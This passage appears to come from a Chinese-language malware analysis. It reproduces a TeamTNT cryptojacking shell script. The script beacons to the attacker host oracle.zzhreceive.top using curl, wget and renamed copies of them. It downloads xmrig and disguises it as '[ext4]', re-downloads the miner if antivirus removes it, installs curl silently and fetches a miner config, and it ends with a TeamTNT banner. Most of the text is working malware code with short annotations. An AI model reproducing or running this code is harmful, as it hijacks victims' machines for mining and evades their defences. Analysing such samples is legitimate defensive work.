    TNTwget -q -O- http://oracle.zzhreceive.top/b2f628/authfailedroot >>/dev/null
    else
    curl  http://oracle.zzhreceive.top/b2f628/authokroot >>/dev/null
    cur http://oracle.zzhreceive.top/b2f628/authokroot >>/dev/null
    cd1 http://oracle.zzhreceive.top/b2f628/authokroot >>/dev/null
    TNTcurl http://oracle.zzhreceive.top/b2f628/authokroot >>/dev/null
    wget -q -O- http://oracle.zzhreceive.top/b2f628/authokroot >>/dev/null
    wge -q -O- http://oracle.zzhreceive.top/b2f628/authokroot >>/dev/null
    wd1 -q -O- http://oracle.zzhreceive.top/b2f628/authokroot >>/dev/null
    TNTwget -q -O- http://oracle.zzhreceive.top/b2f628/authokroot >>/dev/null
    fi
    }
#### 下载门罗币挖矿相关并测试运行结果
    function SetupMoneroOcean1(){
    # printing intentions
    echo "[*] Downloading MoneroOcean advanced version of xmrig to /tmp/xmrig.tar.gz"
    if ! curl -L --progress-bar "$MOxmrigMOD" -o /tmp/xmrig.tar.gz; then
      echo "ERROR: Can't download $MOxmrigMOD file to /tmp/xmrig.tar.gz"
    fi
    echo "[*] Unpacking /tmp/xmrig.tar.gz to $MOHOME/"
    [ -d $MOHOME/ ] || mkdir $MOHOME/
    if ! tar xf /tmp/xmrig.tar.gz -C $MOHOME/; then
      echo "ERROR: Can't unpack /tmp/xmrig.tar.gz to $MOHOME/ directory"
    fi
    chmod +x $MOHOME/\[ext4\]
    rm /tmp/xmrig.tar.gz
    echo "[*] Checking if advanced version of $MOHOME/xmrig works fine (and not removed by antivirus software)"
    $MOHOME/[ext4] --help >/dev/null
    if (test $? -ne 0); then
      if [ -f $MOHOME/[ext4] ]; then
        echo "WARNING: Advanced version of $MOHOME/xmrig is not functional"
      else 
        echo "WARNING: Advanced version of $MOHOME/xmrig was removed by antivirus (or some other problem)"
      fi
      echo "[*] Looking for the latest version of Monero miner"
      #LATEST_XMRIG_RELEASE=`curl -s https://github.com/xmrig/xmrig/releases/latest  | grep -o '".*"' | sed 's/"//g'`
      LATEST_XMRIG_LINUX_RELEASE=$MOxmrigSTOCK
      echo "[*] Downloading $LATEST_XMRIG_LINUX_RELEASE to /tmp/xmrig.tar.gz"
      if ! curl -L --progress-bar $LATEST_XMRIG_LINUX_RELEASE -o /tmp/xmrig.tar.gz; then
        echo "ERROR: Can't download $LATEST_XMRIG_LINUX_RELEASE file to /tmp/xmrig.tar.gz"
      fi
      echo "[*] Unpacking /tmp/xmrig.tar.gz to $MOHOME/"
      if ! tar xf /tmp/xmrig.tar.gz -C $MOHOME/ --strip=1; then
        echo "WARNING: Can't unpack /tmp/xmrig.tar.gz to $MOHOME/ directory"
      fi
      rm /tmp/xmrig.tar.gz
    chmod +x $MOHOME/\[ext4\]
      echo "[*] Checking if stock version is OKAY!"
      $MOHOME/[ext4] --help >/dev/null
      if (test $? -ne 0); then 
        if [ -f $MOHOME/[ext4] ]; then
          echo "ERROR: Stock version of $MOHOME/[ext4] is not functional too"
        else 
          echo "ERROR: Stock version of $MOHOME/[ext4] was removed by antivirus too"
        fi
        echo "ERROR: Can't download $LATEST_XMRIG_LINUX_RELEASE file to /tmp/xmrig.tar.gz"
      fi
    fi
    echo "[*] $MOHOME/[ext4] is OK"
    }
#### TEAMTNT黑产团队标志
    ######################### printing greetings ###########################
    clear
    echo -e " "
    echo -e "                                \e[1;34;49m___________                 _____________________________\033[0m"
    echo -e "                                \e[1;34;49m\__    ___/___ _____    ____\__    ___/\      \__    ___/\033[0m"
    echo -e "                                \e[1;34;49m  |    |_/ __ \\__  \  /     \|    |   /   |   \|    |   \033[0m"
    echo -e "                                \e[1;34;49m  |    |\  ___/ / __ \|  Y Y  \    |  /    |    \    |   \033[0m"
    echo -e "                                \e[1;34;49m  |____| \___  >____  /__|_|  /____|  \____|__  /____|   \033[0m"
    echo -e "                                \e[1;34;49m             \/     \/      \/                \/         \033[0m"
    echo -e " "
    echo -e "                                ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ "
    echo -e " "
    echo -e "                                \e[1;34;49m            Now you get, what i want to give... --- '''      \033[0m"
    echo " "
    echo " "
#### 检查运行的前提条件
钱包地址长度、运行环境配置、是否存在curl命令，前期下载的配置文件和其他软件，若没有就执行SetupMoneroOcean1函数；提前设置好配置文件，替换矿池等，控制CPU使用率
    # checking prerequisites
    if [ -z $WALLET ]; then
      echo "ERROR: wallet"
    fi
    WALLET_BASE=`echo $WALLET | cut -f1 -d"."`
    if [ ${#WALLET_BASE} != 95 ]; then
      echo "ERROR: Wrong wallet base address length (should be 95): ${#WALLET_BASE}"
    fi
    if [ -z $MOHOME ]; then
      echo "ERROR: Please define HOME environment variable to your home directory"
    fi
    if [ ! -d $MOHOME ]; then
      echo "ERROR: Please make sure HOME directory $MOHOME exists or set it yourself using this command:"
      echo '  export HOME='
    fi
    if ! type curl >/dev/null; then
    apt-get update --fix-missing 2>/dev/null 1>/dev/null
    apt-get install -y curl 2>/dev/null 1>/dev/null
    apt-get install -y --reinstall curl 2>/dev/null 1>/dev/null
    yum clean all 2>/dev/null 1>/dev/null
    yum install -y curl 2>/dev/null 1>/dev/null
    yum reinstall -y curl 2>/dev/null 1>/dev/null
    fi
    sleep 2
    $MOHOME/[ext4] --help >/dev/null
    if (test $? -ne 0); then
        SetupMoneroOcean1
    else
        echo "WARNING: Advanced version of $MOHOME/xmrig was removed by antivirus (or some other problem)"
    fi
    if [ -f "$MOHOME/[ext4].pid" ]
     then
             echo "config file exists, neednot backup"
     else
             echo "config file not exists.download from teamtnt"
             SetupMoneroOcean1
    fi
    if [ -f "$MOHOME/[ext4]" ]
     then
             echo "miner file exists"
     else
             curl -L --progress-bar $miner_url -o /tmp/xmrig.tar.gz && tar -xf /tmp/xmrig.tar.gz -C $MOHOME/ && mv $MOHOME/xmrig*/xmrig  $MOHOME/\[ext4\]
    fi
    if [ -f "$MOHOME/[ext4].pid" ]
    then
        echo "miner config exists"
    else
        curl -L --progress-bar $config_url -o  $MOHOME/\[ext4\].pid
    fi